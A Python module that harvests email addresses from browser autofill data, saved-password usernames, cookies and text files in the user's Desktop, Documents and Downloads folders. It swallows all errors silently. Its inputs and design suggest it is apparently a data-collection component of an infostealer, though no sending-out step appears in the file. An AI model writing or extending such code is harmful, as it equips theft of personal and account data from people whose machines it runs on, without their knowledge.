import os
import re

EMAIL_REGEX = re.compile(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}")

def extract_emails_from_text(text):
    try:
        return set(EMAIL_REGEX.findall(text))
    except:
        return set()

def get_emails_from_autofill(autofill_data, passwords):
    emails = set()
    try:
        for entry in autofill_data or []:
            if entry.get('type') == 'email':
                e = entry.get('data','').strip()
                if e and '@' in e:
                    emails.add(e.lower())
            else:
                for found in extract_emails_from_text(entry.get('data','')):
                    emails.add(found.lower())
    except:
        pass
    try:
        for p in passwords or []:
            u = p.get('username','')
            if '@' in u:
                for found in extract_emails_from_text(u):
                    emails.add(found.lower())
    except:
        pass
    return sorted(emails)

def get_emails_from_cookies(cookies):
    emails = set()
    try:
        for c in cookies or []:
            val = c.get('value','')
            for found in extract_emails_from_text(val):
                emails.add(found.lower())
            name = c.get('name','')
            for found in extract_emails_from_text(name):
                emails.add(found.lower())
    except:
        pass
    return sorted(emails)

def scan_files_for_emails(search_roots=None, max_files=50, max_size_kb=100):
    if search_roots is None:
        search_roots = [
            os.path.join(os.path.expanduser("~"), "Desktop"),
            os.path.join(os.path.expanduser("~"), "Documents"),
            os.path.join(os.path.expanduser("~"), "Downloads"),
        ]
    emails = set()
    scanned = 0
    try:
        for root in search_roots:
            if not os.path.exists(root):
                continue
            for dirpath, _, filenames in os.walk(root):
                if dirpath.count(os.sep) - root.count(os.sep) > 3:
                    continue
                for fname in filenames:
                    if scanned >= max_files:
                        break
                    if not fname.lower().endswith(('.txt','.log','.csv','.md','.ini','.cfg','.json')):
                        continue
                    fpath = os.path.join(dirpath, fname)
                    try:
                        if os.path.getsize(fpath) > max_size_kb*1024:
                            continue
                        with open(fpath, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read(50000)
                            for found in extract_emails_from_text(content):
                                emails.add(found.lower())
                        scanned += 1
                    except:
                        continue
                if scanned >= max_files:
                    break
    except:
        pass
    return sorted(emails)

def get_all_emails(autofill_data=None, passwords=None, cookies=None, scan_files=False):
    all_emails = set()
    try:
        for e in get_emails_from_autofill(autofill_data, passwords):
            all_emails.add(e)
        for e in get_emails_from_cookies(cookies):
            all_emails.add(e)
        if scan_files:
            for e in scan_files_for_emails():
                all_emails.add(e)
    except:
        pass
    return sorted(all_emails)
